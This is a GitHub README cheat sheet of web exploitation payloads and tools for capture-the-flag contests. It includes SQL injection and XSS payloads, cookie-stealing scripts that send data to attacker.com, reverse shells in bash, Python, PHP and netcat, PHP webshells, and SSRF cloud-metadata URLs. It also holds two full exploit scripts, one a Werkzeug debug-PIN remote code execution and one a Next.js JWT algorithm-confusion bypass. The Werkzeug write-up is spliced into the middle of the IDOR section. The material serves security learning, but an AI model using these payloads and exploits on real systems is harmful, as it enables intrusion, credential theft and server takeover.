# CTF Cheatsheet 2025 🚀

> A comprehensive guide for Web Exploitation in Capture The Flag (CTF) competitions

[![GitHub stars](https://img.shields.io/github/stars/pugazhexploit/CTF_cheetsheet-2025?style=social)](https://github.com/pugazhexploit/CTF_cheetsheet-2025)
[![GitHub forks](https://img.shields.io/github/forks/pugazhexploit/CTF_cheetsheet-2025?style=social)](https://github.com/pugazhexploit/CTF_cheetsheet-2025/fork)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

---

## 📑 Table of Contents

1. [Web Recon Basics](#1-web-recon-basics)
2. [Directory & File Enumeration](#2-directory--file-enumeration)
3. [HTTP Methods & Headers](#3-http-methods--headers)
4. [Authentication Bypass](#4-authentication-bypass)
5. [Session & Cookie Attacks](#5-session--cookie-attacks)
6. [SQL Injection (SQLi)](#6-sql-injection-sqli)
7. [Cross-Site Scripting (XSS)](#7-cross-site-scripting-xss)
8. [Cross-Site Request Forgery (CSRF)](#8-cross-site-request-forgery-csrf)
9. [File Upload Vulnerabilities](#9-file-upload-vulnerabilities)
10. [Local File Inclusion (LFI)](#10-local-file-inclusion-lfi)
11. [Remote File Inclusion (RFI)](#11-remote-file-inclusion-rfi)
12. [Server-Side Request Forgery (SSRF)](#12-server-side-request-forgery-ssrf)
13. [Command Injection](#13-command-injection)
14. [Template Injection](#14-template-injection)
15. [IDOR (Insecure Direct Object Reference)](#15-idor-insecure-direct-object-reference)
16. [Open Redirect](#16-open-redirect)
17. [JWT Attacks](#17-jwt-attacks)
18. [API Testing & Exploitation](#18-api-testing--exploitation)
19. [Rate Limiting & Brute Force](#19-rate-limiting--brute-force)
20. [WebSocket Attacks](#20-websocket-attacks)
21. [Source Code Disclosure](#21-source-code-disclosure)
22. [Debug & Misconfiguration Issues](#22-debug--misconfiguration-issues)
23. [Useful Payloads & Wordlists](#23-useful-payloads--wordlists)
24. [Automation Tools](#24-automation-tools)
25. [CTF Challenge Solutions](#25-ctf-challenge-solutions)

---

## 1. Web Recon Basics

### 🔍 Initial Reconnaissance

```bash
# Subdomain enumeration
subfinder -d target.com -o subdomains.txt
assetfinder --subs-only target.com
amass enum -d target.com

# DNS enumeration
dig target.com ANY
nslookup target.com
host -t any target.com

# WHOIS lookup
whois target.com

# Check robots.txt, sitemap.xml
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml

# Technology fingerprinting
whatweb https://target.com
wappalyzer
builtwith.com
```

### 🌐 Port Scanning

```bash
# Nmap
nmap -sV -sC -p- target.com
nmap -p 80,443,8080 -A target.com

# Masscan (faster)
masscan -p1-65535 target.com --rate=1000
```

### 📸 Screenshots

```bash
# EyeWitness
eyewitness -f urls.txt --web

# Aquatone
cat urls.txt | aquatone
```

---

## 2. Directory & File Enumeration

```bash
# Gobuster
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js

# Dirsearch
dirsearch -u https://target.com -e php,html,js,txt
dirsearch -u https://target.com -w /path/to/wordlist.txt

# Ffuf
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302 -fc 404

# Feroxbuster
feroxbuster -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Wfuzz
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 https://target.com/FUZZ
```

### 🎯 Common Files to Check

```
/.git/
/.env
/.DS_Store
/config.php
/phpinfo.php
/backup.zip
/database.sql
/admin/
/api/
/swagger/
graphql
```

---

## 3. HTTP Methods & Headers

### 🔧 HTTP Methods

```bash
# Test different HTTP methods
curl -X OPTIONS https://target.com -v
curl -X PUT https://target.com/file.txt -d "data" -v
curl -X DELETE https://target.com/file.txt -v
curl -X TRACE https://target.com -v

# Check allowed methods
curl -X OPTIONS https://target.com -i
```

### 📋 Important Headers

```bash
# Host Header Injection
curl -H "Host: evil.com" https://target.com

# X-Forwarded-For (IP Spoofing)
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com
curl -H "X-Forwarded-For: 192.168.1.1" https://target.com

# X-Original-URL / X-Rewrite-URL (Access Control Bypass)
curl -H "X-Original-URL: /admin" https://target.com

# Custom Headers
curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target.com
curl -H "X-Forwarded-Host: localhost" https://target.com
```

### 🎭 User-Agent Manipulation

```bash
curl -H "User-Agent: Googlebot/2.1" https://target.com
curl -H "User-Agent: () { :; }; echo vulnerable" https://target.com  # Shellshock
```

---

## 4. Authentication Bypass

### 🔓 Common Techniques

```bash
# SQL Injection in login
username: admin' OR '1'='1
password: admin' OR '1'='1

username: admin'--
password: anything

# NoSQL Injection
username[$ne]=admin&password[$ne]=password

# JWT manipulation (see JWT section)

# Session fixation
# Cookie manipulation

# Default credentials
admin:admin
admin:password
root:root
administrator:administrator
```

### 🕵️ Bypass Filters

```python
# Username enumeration
usernames = ['admin', 'root', 'user', 'test']
for user in usernames:
    response = requests.post(url, data={'username': user, 'password': 'wrong'})
    # Check response time, error messages, status codes
```

### 🔑 Password Reset Exploitation

```bash
# Parameter pollution
email=victim@target.com&email=attacker@evil.com

# Host header injection
Host: evil.com

# Token prediction
# Check for weak token generation
```

---

## 5. Session & Cookie Attacks

### 🍪 Cookie Manipulation

```bash
# View cookies
document.cookie  # In browser console

# Decode cookies
echo "base64string" | base64 -d

# Cookie flags to check
Secure
HttpOnly
SameSite

# Flask cookie decoding
flask-unsign --decode --cookie 'cookie_value'

# Try to forge
flask-unsign --sign --cookie "{'user': 'admin'}" --secret 'SECRET_KEY'
```

### 🔐 Session Attacks

```python
# Session fixation
import requests

session = requests.Session()
# Set session ID
session.cookies.set('PHPSESSID', 'fixed_session_id')
```

---

## 6. SQL Injection (SQLi)

### 💉 Basic Payloads

```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin'#
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Error-based
' AND 1=CONVERT(int, (SELECT @@version))--
' AND 1=CONVERT(int, (SELECT DB_NAME()))--

# Time-based
' OR SLEEP(5)--
' OR pg_sleep(5)--
'; WAITFOR DELAY '00:00:05'--

# Boolean-based
' AND 1=1--  # True
' AND 1=2--  # False
```

### 🛠️ SQLMap

```bash
# Basic scan
sqlmap -u "https://target.com/page?id=1" --dbs

# POST request
sqlmap -u "https://target.com/login" --data="username=admin&password=pass" --dbs

# Cookie-based
sqlmap -u "https://target.com/page" --cookie="PHPSESSID=value" --dbs

# Dump database
sqlmap -u "https://target.com/page?id=1" -D database_name --dump

# OS shell
sqlmap -u "https://target.com/page?id=1" --os-shell

# Bypass WAF
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment --random-agent
```

### 🎯 Advanced Techniques

```sql
# Extract data
' UNION SELECT username,password FROM users--

# File read (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd')--

# File write (MySQL)
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--

# Database enumeration
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

---

## 7. Cross-Site Scripting (XSS)

### 🚨 Basic Payloads

```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
```

### 🎭 Bypass Filters

```html
# Uppercase/lowercase
<ScRiPt>alert('XSS')</sCrIpT>

# Without spaces
<svg/onload=alert('XSS')>

# Without parentheses
<script>alert`XSS`</script>

# Encoding
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;

# Alternative tags
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
```

### 🍪 Cookie Stealing

```html
<script>
fetch('https://attacker.com/?cookie=' + document.cookie)
</script>

<script>
new Image().src='https://attacker.com/?cookie='+document.cookie
</script>

<img src=x onerror="this.src='https://attacker.com/?cookie='+document.cookie">
```

### 🔧 XSS Tools

```bash
# XSStrike
xsstrike -u "https://target.com/page?param=value"

# Dalfox
dalfox url https://target.com/page?param=value

# Manual testing
# Always check: input fields, URL parameters, HTTP headers
```

---

## 8. Cross-Site Request Forgery (CSRF)

### 📝 Basic CSRF PoC

```html
<!-- GET request -->
<img src="https://target.com/delete?id=123">

<!-- POST request -->
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Click me">
</form>

<script>
  document.forms[0].submit();
</script>
```

### 🎯 CSRF with JSON

```html
<script>
fetch('https://target.com/api/change-password', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({password: 'newpass123'})
});
</script>
```

### 🛡️ Bypass CSRF Tokens

```bash
# Remove token
# Change request method (POST to GET)
# Use another user's token
# Predict weak tokens
# Null or empty token value
```

---

## 9. File Upload Vulnerabilities

### 📤 Bypass Techniques

```bash
# Extension bypass
file.php
file.php.jpg
file.php.png
file.php%00.jpg
file.php%0a.jpg
file.php.....
file.PHP
file.phP
file.php3
file.php4
file.php5
file.phtml
file.phar

# MIME type manipulation
Content-Type: image/jpeg  # But upload PHP file

# Magic bytes (add to PHP file)
GIF89a;
<?php system($_GET['cmd']); ?>

# Double extension
file.jpg.php
file.php.jpg

# Null byte injection
file.php%00.jpg
file.php\x00.jpg
```

### 🎯 Webshells

```php
# Simple PHP shell
<?php system($_GET['cmd']); ?>

# Access: shell.php?cmd=whoami

# More advanced
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

### 🖼️ Image Upload Exploitation

```bash
# Exiftool metadata injection
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg

# ImageTragick (CVE-2016-3714)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context
```

---

## 10. Local File Inclusion (LFI)

### 📁 Basic Payloads

```bash
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/version
/var/log/apache2/access.log
/var/log/nginx/access.log
~/.bash_history
~/.ssh/id_rsa

# Windows
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\xampp\apache\logs\access.log
```

### 🎯 Traversal Techniques

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..\/..\/..\/etc/passwd

# Null byte
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
php://input  # + POST data
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://whoami
```

### 🔧 Log Poisoning

```bash
# 1. Inject PHP code in User-Agent
curl -A "<?php system($_GET['cmd']); ?>" https://target.com

# 2. Include log file
https://target.com/?page=../../../var/log/apache2/access.log&cmd=whoami
```

---

## 11. Remote File Inclusion (RFI)

### 🌐 Basic RFI

```bash
# Include remote file
https://target.com/?page=http://attacker.com/shell.txt

# Create shell.txt on attacker server
<?php system($_GET['cmd']); ?>

# Execute
https://target.com/?page=http://attacker.com/shell.txt&cmd=whoami
```

### 🎯 RFI Techniques

```bash
# Using PHP wrappers
http://attacker.com/shell.php
ftp://attacker.com/shell.php

# SMB share (Windows)
\\attacker.com\share\shell.php
```

---

## 12. Server-Side Request Forgery (SSRF)

### 🎯 Basic SSRF

```bash
# Access internal services
http://localhost/admin
http://127.0.0.1/admin
http://0.0.0.0/admin
http://[::1]/admin
http://169.254.169.254/latest/meta-data/  # AWS metadata

# Port scanning
http://localhost:22
http://localhost:3306
http://localhost:6379
```

### 🔧 Bypass Techniques

```bash
# IP obfuscation
http://127.0.0.1
http://127.1
http://2130706433  # Decimal
http://0x7f.0x0.0x0.0x1  # Hexadecimal
http://0177.0000.0000.0001  # Octal

# DNS rebinding
http://localtest.me -> 127.0.0.1
http://customer1.app.localhost.my.company.127.0.0.1.nip.io

# Redirect
http://attacker.com/redirect -> http://localhost/admin

# URL encoding
http://127.0.0.1/%61dmin
```

### ☁️ Cloud Metadata

```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## 13. Command Injection

### 💉 Basic Payloads

```bash
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)
%0awhoami
%0dwhoami

```

### 🎯 Command Chaining

```bash
# Linux
; ls
| ls
|| ls
& ls
&& ls

# Both Linux and Windows
127.0.0.1 & whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
```

### 🔧 Bypass Filters

```bash
# Without spaces
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Obfuscation
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
ca$@t /etc/passwd

# Environment variables
$PATH
$HOME
$USER
```

### 🚀 Reverse Shell

```bash
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
nc -e /bin/sh attacker.com 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

---

## 14. Template Injection

### 🎨 Server-Side Template Injection (SSTI)

```python
# Jinja2 (Python)
{{ 7*7 }}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ config.items() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

# Flask/Jinja2 RCE
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Twig (PHP)
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Smarty (PHP)
{php}echo `id`;{/php}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

# Velocity (Java)
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
```

### 🔍 Detection

```bash
# Test various template engines
{{7*7}}  # = 49 (Jinja2, Twig)
${7*7}   # = 49 (Freemarker, Velocity)
<%= 7*7 %>  # = 49 (ERB)
${{7*7}}  # = 49 (Various)
```

---

## 15. IDOR (Insecure Direct Object Reference)

### 🎯 Common Targets

```bash
# User IDs
/user/profile?id=123
/api/user/456

# Document IDs
/document/view?doc=789
/download?file=report_123.pdf

# Order IDs
/order/details?order_id=1001
```

### 🎧 Testing Methodology

```python
import requests

# Test sequential IDs
for user_id in range(1, 100):
    response = requests.get(f'https://target.com/api/user/{user_id}', 
                          cookies={'session': 'your_session'})
    if response.status_code == 200:
        print(f'User {user_id}: {response.json()}')
```
# Flask Debug Console PIN Exploit (Werkzeug RCE)

## Overview

This repository contains an exploit targeting a Flask application running with the Werkzeug debugger enabled in production.

The exploit demonstrates how to:

- Abuse Local File Inclusion (LFI)
- Reconstruct the Werkzeug debug PIN
- Bypass debugger authentication
- Achieve Remote Code Execution (RCE)
- Extract the flag from the server

Target:
https://my-flask-app.chals.sekai.team:1337

---

## Vulnerability Summary

The application was running in debug mode:

    app.run(debug=True)

This exposed the Werkzeug interactive debugger console at:

    /console

The debugger is protected by a PIN mechanism. However, the PIN is deterministically generated using predictable server values. If those values are leaked, the PIN can be reconstructed.

Additionally, the application contains a Local File Inclusion vulnerability via:

    /view?filename=<path>

This allows reading sensitive files from the server.

---

## Attack Chain

1. Exploit LFI to read:
   - /sys/class/net/eth0/address
   - /proc/sys/kernel/random/boot_id

2. Recreate Werkzeug PIN using:
   - Public bits:
        - username
        - module name
        - application name
        - flask app file path
   - Private bits:
        - MAC address
        - boot_id

3. Extract the debugger SECRET from /console

4. Authenticate using:
        __debugger__=yes
        cmd=pinauth
        pin=<calculated_pin>
        s=<secret>

5. Obtain session cookie

6. Execute arbitrary Python code:
        __import__('os').popen('cat /flag*').read()

7. Retrieve flag

---

## Exploit Flow

The exploit performs the following steps:

- Reads MAC address and boot_id via LFI
- Reconstructs Werkzeug PIN using SHA1 hashing
- Retrieves debugger secret token
- Authenticates to debugger console
- Executes OS command to read flag
- Extracts flag using regex

---

## Technical Details

Werkzeug PIN generation logic:

SHA1(probably_public_bits + private_bits + "cookiesalt")
SHA1(previous_hash + "pinsalt")

The resulting hash is converted into a 9-digit PIN and formatted.

Because MAC address and boot_id are readable through LFI, the PIN becomes predictable.

This allows full debugger authentication bypass.

---

## Impact

- Remote Code Execution
- Full server compromise
- Arbitrary command execution
- Sensitive file disclosure

This vulnerability is critical.

---

## Mitigation

- Never deploy Flask with debug=True in production
- Remove LFI vulnerabilities
- Use production WSGI servers (gunicorn / uWSGI)
- Restrict access to internal endpoints
- Configure reverse proxy rules

---

## Usage

Install dependencies:

    pip install requests

Run exploit:

    python exploit.py

If successful, the script will output:

    Found Console PIN
    Found Secret
    Found Cookie
    Found flag

---

## Educational Purpose

This repository is created for CTF and security research purposes only.

Do not use this against systems without authorization.

---

## Author

Security Research / CTF Writeup
## Exploit program 
```
from requests import get
import hashlib
from itertools import chain
import re

HOST = "https://my-flask-app.chals.sekai.team:1337"

def getfile(filename):
    try:
        response = get(f"{HOST}/view?filename={filename}")
        return response.text
    except Exception as e:
        print(f"Error: {e}")
        return None
    
def get_pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv

def get_secret():
    response = get(f"{HOST}/console", headers={"Host": "127.0.0.1"})
    match = re.search(r'SECRET\s*=\s*["\']([^"\']+)["\']', response.text)

    if match:
        return match.group(1)
    return None

def authenticate(secret, pin):
    response = get(f"{HOST}/console?__debugger__=yes&cmd=pinauth&pin={pin}&s={secret}", headers={"Host": "127.0.0.1"})
    return response.headers.get("Set-Cookie")

def execute_code(cookie, code, secret):
    response = get(f"{HOST}/console?__debugger__=yes&cmd={code}&frm=0&s={secret}", headers={"Host": "127.0.0.1", "Cookie": cookie})
    return response.text

if __name__ == "__main__":

    mac = getfile("/sys/class/net/eth0/address")
    mac = str(int("0x" + "".join(mac.split(":")).strip(), 16))
    boot_id = getfile("/proc/sys/kernel/random/boot_id").strip()
    
    # should be default
    probably_public_bits = [
        'nobody',
        'flask.app',
        'Flask',
        '/usr/local/lib/python3.11/site-packages/flask/app.py' # change this to the path of the flask app
    ]

    private_bits = [
        mac,
        boot_id
    ]

    print("Found Console PIN: ", get_pin(probably_public_bits, private_bits))

    secret = get_secret()
    print("Found Secret: ", secret)

    cookie = authenticate(secret, get_pin(probably_public_bits, private_bits))
    print("Found Cookie: ", cookie)

    print("Executing code...")

    output = execute_code(cookie, "__import__('os').popen('cat /flag*').read()", secret)
    
    match = re.search(r'SEKAI\{.*\}', output)
    if match:
        print("Found flag: ", match.group(0))
    else:
        print("No flag found")

    print("Done")
```






### 🎭 Bypass Techniques

```bash
# Try different HTTP methods
GET /api/user/123
POST /api/user/123
PUT /api/user/123
DELETE /api/user/123

# Parameter pollution
/api/user?id=123&id=456

# Encoded values
/api/user/MTIz  # Base64
/api/user/7b  # Hexadecimal

# GUID/UUID prediction
# Check for weak or predictable UUIDs
```

---

## 16. Open Redirect

### 🔀 Basic Payloads

```bash
?url=https://evil.com
?redirect=https://evil.com
?next=https://evil.com
?return=https://evil.com
?returnUrl=https://evil.com
?return_url=https://evil.com
?checkout_url=https://evil.com
?continue=https://evil.com
?dest=https://evil.com
?destination=https://evil.com
?redir=https://evil.com
?redirect_uri=https://evil.com
?rurl=https://evil.com
?target=https://evil.com
?view=https://evil.com
```

### 🎯 Bypass Filters

```bash
# Protocol bypass
//evil.com
///evil.com
////evil.com
https:evil.com
https:/evil.com

# @ character
https://target.com@evil.com

# Subdomain
https://target.com.evil.com

# URL encoding
https://%65%76%69%6C%2E%63%6F%6D

# Null byte
https://target.com?redirect=https://evil.com%00.target.com

# Backslash
https://target.com?redirect=https://evil.com\@target.com
```

---

## 17. JWT Attacks

### 🔑 JWT Structure

```
Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.signature
```

### 🎯 Attack Techniques

```python
# 1. None algorithm
# Change "alg": "HS256" to "alg": "none"
# Remove signature

# 2. Algorithm confusion (RS256 to HS256)
import jwt

# Get public key
public_key = """-----BEGIN PUBLIC KEY-----
...
-----END PUBLIC KEY-----"""

# Create token signed with public key
payload = {"username": "admin"}
token = jwt.encode(payload, public_key, algorithm="HS256")

# 3. Weak secret brute force
# Use jwt_tool or hashcat
```

### 🛠️ JWT Tools

```bash
# jwt_tool
jwt_tool <JWT> -C -d secrets.txt

# Decode JWT
jwt_tool <JWT>

# Tamper JWT
jwt_tool <JWT> -T

# jwt-cracker
jwt-cracker <JWT> <alphabet> <max-length>

# John the Ripper
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

### 🎯 CTF Challenge: Next Jason (CVE-2025-29927)

**Vulnerability:** Next.js Authorization Bypass + JWT Algorithm Confusion

**Solution:**

```python
import requests
import jwt
from urllib.parse import *

URL = 'http://a370afda41a7.challs.ctf.r0devnull.team:8001/'

########## "Fix" pyjwt
# pyjwt's HMACAlgorithm doesn't allow using public keys as secrets, so
# we override it here, removing the check
def prepare_key(self, key):
    key = jwt.utils.force_bytes(key)
    return key

jwt.algorithms.HMACAlgorithm.prepare_key = prepare_key

class Exploit:
    def __init__(self, url=URL):
        self.url = url

    def getPublicKey(self):
        headers = {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"}
        req = requests.get(urljoin(self.url, "api/getPublicKey"), headers=headers)
        return req.json()['PUBKEY']

    def keyConfusion(self):
        pubkey = self.getPublicKey()
        payload = {"username": "admin"}
        forgedJWT = jwt.encode(payload, pubkey, algorithm="HS256")
        return forgedJWT

    def getFlag(self):
        headers = {
            "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware",
            "Cookie": f"token={self.keyConfusion()}"
        }
        req = requests.get(urljoin(self.url, "api/getFlag"), headers=headers)
        return req.json()

if __name__ == '__main__':
    run = Exploit()
    print(run.getFlag())
```

**Attack Flow:**
1. Bypass Next.js authorization using `x-middleware-subrequest` header
2. Get public key from `/api/getPublicKey` endpoint
3. Forge JWT with algorithm confusion (RS256 → HS256)
4. Sign token with public key as HMAC secret
5. Access `/api/getFlag` with forged token

---

## 18. API Testing & Exploitation

### 🔍 API Reconnaissance

```bash
# Common API endpoints
/api/
/api/v1/
/api/v2/
/graphql
/swagger
/swagger.json
/swagger-ui
/api-docs
/openapi.json
/wadl
/wsdl

# GraphQL introspection
{__schema{types{name,fields{name}}}}
```

### 🎯 REST API Testing

```bash
# Curl commands
curl -X GET https://api.target.com/users
curl -X POST https://api.target.com/users -H "Content-Type: application/json" -d '{"name":"test"}'
curl -X PUT https://api.target.com/users/1 -d '{"name":"updated"}'
curl -X DELETE https://api.target.com/users/1

# Check for mass assignment
POST /api/users
{"username": "test", "email": "test@test.com", "isAdmin": true}

# Parameter pollution
/api/user?id=1&id=2

# Excessive data exposure
/api/users/1  # Returns all user data including sensitive info
```

### 🔧 GraphQL Exploitation

```graphql
# Introspection query
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# Query batching (DoS)
query {
  user1: user(id: 1) { name }
  user2: user(id: 2) { name }
  ...
  user1000: user(id: 1000) { name }
}

# Nested query (DoS)
query {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              # ... deeply nested
            }
          }
        }
      }
    }
  }
}
}
```

---

## 19. Rate Limiting & Brute Force

### 🔨 Bypass Rate Limiting

```bash
# IP rotation
X-Forwarded-For: 1.2.3.4
X-Forwarded-For: 127.0.0.1
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4

# Using null bytes
username=admin%00
username=admin%0d%0a

# Case manipulation
username=Admin
username=ADMIN
username=aDmIn
```

### 🎯 Brute Force Tools

```bash
# Hydra
hydra -l admin -P passwords.txt https://target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Medusa
medusa -h target.com -u admin -P passwords.txt -M http -m DIR:/login

# Ffuf
ffuf -w passwords.txt -X POST -d "username=admin&password=FUZZ" -u https://target.com/login -mc 200,302

# Burp Intruder
# Use Burp Suite's Intruder with payload positions
```

### 🔐 2FA Bypass

```bash
# Missing 2FA implementation on critical functions
# Reuse old 2FA tokens
# Brute force 2FA codes (if short)
# CSRF on 2FA disabling
# API endpoints without 2FA
# Response manipulation (change false to true)
```

---

## 20. WebSocket Attacks

### 🔌 WebSocket Basics

```javascript
// Connect to WebSocket
var ws = new WebSocket("wss://target.com/socket");

ws.onopen = function() {
  ws.send("Hello Server!");
};

ws.onmessage = function(event) {
  console.log("Received: " + event.data);
};

// Send data
ws.send(JSON.stringify({action: "subscribe", channel: "admin"}));
```

### 🎯 WebSocket Exploitation

```javascript
// CSWSH (Cross-Site WebSocket Hijacking)
<script>
var ws = new WebSocket("wss://target.com/socket");
ws.onopen = function() {
  ws.send("Get sensitive data");
};
ws.onmessage = function(event) {
  fetch('https://attacker.com/?data=' + event.data);
};
</script>

// Message injection
ws.send('{"user":"admin","message":"<script>alert(1)</script>"}');

// Authentication bypass
// Send messages without proper authentication
```

### 🛠️ WebSocket Testing Tools

```bash
# wscat
wscat -c wss://target.com/socket

# Send message
> {"action": "getUsers"}

# wssip (WebSocket Manipulation Proxy)
# Use with Burp Suite
```

---

## 21. Source Code Disclosure

### 📂 Common Sources

```bash
# Git exposure
/.git/
/.git/config
/.git/HEAD
/.git/logs/HEAD

# Tool: GitDumper
git-dumper https://target.com/.git/ output/

# SVN exposure
/.svn/
/.svn/entries

# Backup files
/backup.zip
/backup.tar.gz
/www.zip
/site.zip
/db_backup.sql
/database.sql

# Source code files
/index.php.bak
/config.php~
/config.php.old
/config.php.swp
/.config.php.swp

# IDE files
/.vscode/
/.idea/
/.DS_Store

# Environment files
/.env
/.env.local
/.env.production
/config.json
```

### 🔍 Techniques

```bash
# Directory listing
https://target.com/uploads/
https://target.com/backups/

# Path traversal to source
https://target.com/download?file=../../index.php

# PHP source via filter
https://target.com/?page=php://filter/convert.base64-encode/resource=index.php

# Comments in HTML
<!-- TODO: Remove debug mode -->
<!-- Admin panel: /secret_admin_panel -->
```

---

## 22. Debug & Misconfiguration Issues

### 🐛 Debug Mode

```bash
# Flask debug mode
# Werkzeug debugger with console access

# Django debug
DEBUG = True
# Shows full stack traces, SQL queries, settings

# PHP errors
display_errors = On
error_reporting = E_ALL

# Stack traces
# Look for file paths, database credentials, API keys
```

### ⚙️ Common Misconfigurations

```bash
# CORS misconfiguration
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# Security headers missing
X-Frame-Options
X-XSS-Protection
Content-Security-Policy
Strict-Transport-Security

# Directory listing enabled
Options +Indexes

# Default credentials
# Check documentation for default admin credentials

# Outdated software
# Check for known CVEs
```

### 🔑 Exposed Secrets

```bash
# API keys in JavaScript
# Search for:
api_key=
apikey=
api-key=
secret=
password=
token=

# GitHub commits
# Check git history for secrets
git log -p | grep -i "password\|key\|secret"

# Environment variables
/proc/self/environ
```

---

## 23. Useful Payloads & Wordlists

### 📚 Wordlists

```bash
# SecLists (Must-have)
https://github.com/danielmiessler/SecLists

# Common paths
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

# Passwords
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/wordlists/rockyou.txt

# Fuzzing
/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt
/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
```

### 🎯 Payload Collections

```bash
# PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings

# OWASP Cheat Sheets
https://cheatsheetseries.owasp.org/

# HackTricks
https://book.hacktricks.xyz/
```

---

